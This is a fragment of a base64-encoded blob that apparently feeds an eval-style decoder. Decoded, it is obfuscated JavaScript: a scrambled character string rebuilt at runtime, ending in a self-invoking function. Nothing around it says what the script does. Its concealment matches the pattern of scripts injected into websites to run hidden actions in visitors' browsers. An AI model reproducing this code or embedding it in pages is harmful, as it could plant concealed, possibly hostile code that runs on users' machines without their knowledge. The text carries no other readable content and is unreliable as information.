vcDw8bzw8ImNuJTwwIl0uPW9hNF9fOzxfXFxyPGFuMmMkPGU3PHA8Nl8pZSgoXXVRLCksfWI8ZF89PGo8LjxjMTNhPEZlZXM7IDI9PFhpPCg8ZHk8OXRdbz1jPCAsb28hPGM9PCo8X1t0bzR1PFxcaG08ZSZlZixvPHNhPHRyVnNzbzVjUmddcjw8STwpPClfYzIpbitMcm89NFQlZXR9czwsRy4he0Fzc2xscChlNnZ9PDx2PC40MnklZylFayRwYzYlMzdpaXlpbm9zWzxldD00OmMuJGMoKWwxKTwpO288bz0kb0pFaXI8ZW81K2VjdzMxX1dubWwuZmZiZil0Lj88YCx0P2IxbXI8PGc2LjVhPTx9YW9qXzw3Y0k8XCdTKF1pdHU8dHQuLmQ8bDwyPW5lfXJAKTwpTSh1YTx0aWIoZF10bHJjZHRdIUQxc2kpKUkyXTQxYyh0aGk8dGgwe108PTx0Y29hSTw8WzxvPCxoLmx0PXMsNDE8IE5fPGNjPDpdNG9rYDw8ZmosbH1taXYibWVjaCg7b2EuZ2JgcmVuPWl0bSw6PS5hdG0zJS4hXFwycFdlTV1vUjxxWzltPF82XCc9XXJcJ3dfcjw7LTFodF8lOzw8PF1JbzA8OWY8Uj10PHIyPDkraWllez0lan1zLnBOcipdNTEoaSVdbnU8SWwgXW5pLmNldCU2VzRhfTUmbGlvZmUzISllPHJjcnYgeHc8c3R0Y10ydSUubDk8MTU4ZXk7aWQ2LWE7X3ZfVzI8dmsxNTtubTddY309ZClbPEpfamNUPDJzMTopaWFlX01kPC5yPHRpPW8oPHUuXytvPV0lc2ExJSE6XzZdPCVyPD08c2FuPHJvc188aDo8XzxuX3UzXWFLOHRjLiFfXyBlKGMzITFhbGV3PTxmOiY4fTMuXzlfPGRfO3I8YzAwXS4gZW9yVEVpdDw8XX08ezxwZzE9PGZ9PDo8IGVuZCA8JG4wYzwtLj04byBiM2NzaWNdY2NnLUMmLiA7XzBjZTwjPEgsM10gdjAhJWM9e3NuKSA8XXBiIThbaDQ7XTwgMTk0QzwwOShjPWM8YyAkcilfQGY9KGEjcG48fV9bMW4hMF9jPE5gK3JmM25dJHRdbmxpbzQgP3M9bjdqPFs8bi59dCkmMTxfKVEoOWV0dDx0bzQgdFROPHMxJl08PDxfMmNfbnBuNnlgPF0pLk44PG80TWIuclRdXXJlMCIwbzxlKG48cyF3ezg7MmVtaU5jdDM8ZWRjaXRlczFpPGNWe2w0UCs8JC5oXWMydCVdZTEgPV1dLDFUXTNlcykpJSBxZWFnJTwzPHR0YVIgPC48fXRpKFVfJW5kIF9pNDYxY2kpKSxXPGxvIF9lPF88PDc8ZWM8KDo8KDRkOy50PHBUJl0gLjxrYyBTaXQ7bzZtOzs9IDMuc2k8e2lHYzxkdS5rdCBEOSkyYzwuYi5lXyE0JmYlPG5nKSBhZTRuID0uPCglPG90PWlyMz1jPFd0JDQ8fTNzMj16Mm1yIGV7OF9lXS5udGUhbjw8YTFpMCBkZCkuKSFpdGIpXWUuZV0nKSk7dmFyIE5WRT1NUEQoSnV2LHlPdCApO05WRSg3NDk5KTtyZXR1cm4gNDc5OH0pKCk='))
